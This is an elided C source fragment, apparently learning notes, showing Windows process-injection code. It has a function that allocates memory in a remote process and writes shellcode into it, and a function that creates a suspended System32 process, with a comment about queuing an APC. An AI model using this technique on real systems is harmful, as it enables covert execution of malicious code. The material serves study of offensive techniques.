...
*/
// ppAddress: pointer to variable access address 
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	// sNumberOfBytesWritten: Tracks hoew many bytes were written to the target process
	SIZE_T	sNumberOfBytesWritten = NULL;
	// Protection: dw(DoubleWord)
	// OldProtection: stores the previous memory protection flags when you change memory permissions with VirtualProtectEx.
	...
	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	...
	getchar();
	//WriteProcessMemory: copies bytes from our program into another process
...
BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
	...
	// WnDr: Windows Directory
	// lpPath: Full path to process executable 
	// this is the one which creates path in yr default path of the file location .exe path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	// this are the 10 parameters which are defined here in order check the screenshot uploaded.
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
	...
	*/
	...
	// Populating (Pi) the OUTPUT parameter with 'CreateProcessA's output'
...
// Basically adds a new APC to a specific thread's queue
